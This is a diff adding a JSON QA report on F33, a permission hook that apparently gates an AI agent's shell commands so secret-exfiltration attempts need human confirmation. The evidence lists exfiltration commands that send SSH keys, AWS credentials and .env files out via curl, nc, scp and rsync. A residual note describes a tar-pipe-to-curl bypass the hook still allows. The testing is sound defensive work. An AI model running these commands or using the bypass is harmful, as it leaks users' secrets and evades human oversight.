@@ -1,0 +1,67 @@
+{
+  "timestamp": "2026-07-05T18:00:00Z",
+  "sprint": 19,
+  "iteration": 1,
+  "features_evaluated": [
+    "F33"
+  ],
+  "security_tier": "critical",
+  "scores": {
+    "functionality": 9,
+    "code_quality": 8,
+    "security": 8,
+    "error_handling": 8,
+    "test_coverage": 8
+  },
+  "score": 8,
+  "score_method": "min_of_5",
+  "pass_threshold": 7,
+  "verdict": "pass",
+  "fail_reasons": [],
+  "evidence": {
+    "bats": "bats tests/ (single run) — 395 passed, 0 failed, 0 not-ok. F33 tests 250-259 all pass (6 never-allow + 4 legit-allow).",
+    "exfil_injection": "8/8 exfil vectors gate to ask (not allow): curl -X POST -d @~/.ssh/id_rsa, curl --upload-file ~/.aws/credentials, curl -F file=@~/.ssh/id_rsa, cat ~/.ssh/id_rsa | nc, nc < ~/.ssh/id_rsa, scp ~/.ssh/id_rsa host:, curl -d @.env, rsync ~/.gnupg/x host:. Advanced base64-pipe variant also gated (ask via pattern 3).",
+    "legit_egress": "6/6 legit egress stay allow: curl -s .../data, curl -d @payload.json, wget .../file.tar.gz, curl GET .../v1/credentials (no data flag), scp build.tar host:, curl -X POST -d name=foo (no @).",
+    "add_only": "BLOCKED 13->13, INDIRECT 15->15, ASK 26->30 (+4), zero deletions in hook diff. bats @test 152->162 (+10, add-only). invariant-guard: current firewall Write exit 0 (pass); ASK 30->29 weakened Write exit 2 (deny, INV-5 detected).",
+    "probe_s5": "behavioral.sh on fixed hook => [] (clean). On pre-F33 (leaky) hook => 4 egress leaks detected (5th, scp id_rsa, already gated by main local-move ASK => expected overlap). Proves probe is a real detector, not a no-op.",
+    "misc": "shellcheck -S warning clean (hook+probe+guard); versions 1.15.4 x3 (package/plugin/marketplace); consistency probe 0; ADR-004 Amendment 4 present."
+  },
+  "passed_criteria": {
+    "acceptance": [
+      "F33-1: curl/wget data/upload flag + sensitive file -> ask (verified by injection)",
+      "F33-2: sensitive read piped to nc/curl -> ask (verified)",
+      "F33-3: scp/rsync sensitive -> remote -> ask (verified)",
+      "F33-4: legit egress unharmed / allow (verified 6/6)",
+      "F33-5: behavioral corpus +5 exfil variants; fixed hook [] / leaky detected (verified)",
+      "F33-6: bats exfil never-allow + legit allow add-only (verified, 10 tests)"
+    ],
+    "security": [
+      "SC1: add-only, BLOCKED/INDIRECT unchanged, ASK +4, invariant-guard denies weakening (exit 2)",
+      "SC2: exfil vectors gated by injection (8/8)",
+      "SC3: over-gating avoided, non-sensitive egress stays allow (6/6)",
+      "SC4: ask (not deny) — automated/unattended exfil downgraded to human confirm",
+      "SC5: corpus expansion is never-allow only; probe clean on fixed hook"
+    ],
+    "error_scenarios": [
+      "curl GET .../credentials URL (no data flag) -> allow (not over-gated)",
+      "curl -d @.env -> ask (secret upload gated)",
+      "jq-absent fail-safe path unchanged (no edit to that branch)"
+    ]
+  },
+  "failed_criteria": {
+    "acceptance": [],
+    "security": [],
+    "error_scenarios": []
+  },
+  "criteria_gaps": {
+    "missing_criteria": [],
+    "ambiguous_criteria": [],
+    "security_criteria_insufficient": [],
+    "residual_notes": [
+      "Minor over-gate (accepted per SC3 error scenario): curl -d @payload.json https://api.com/v1/token -> ask because URL path contains 'token' after a data flag. It is ask (recoverable), not block — within the contract's safe-side acceptance.",
+      "Residual bypass beyond stated scope (future hardening, not a fail reason): tar czf - ~/.ssh | curl --data-binary @- (directory ref without trailing slash, no id_rsa token) -> allow. SC4 frames the gate as a speed-bump against automated/careless exfil, not comprehensive DLP; all stated vectors gate."
+    ],
+    "action_required": "none for pass. Optional future hardening: broaden sensitive-path token to catch dir refs without trailing slash; add a pipe/encode boundary test."
+  },
+  "lessons": "egress gate binds (network transmitter + sensitive-file reference); URL-path substrings like token/credentials only gate when a data/upload flag is also present, which suppresses GET false-positives but can over-gate POSTs to such endpoints (ask, recoverable)."
+}
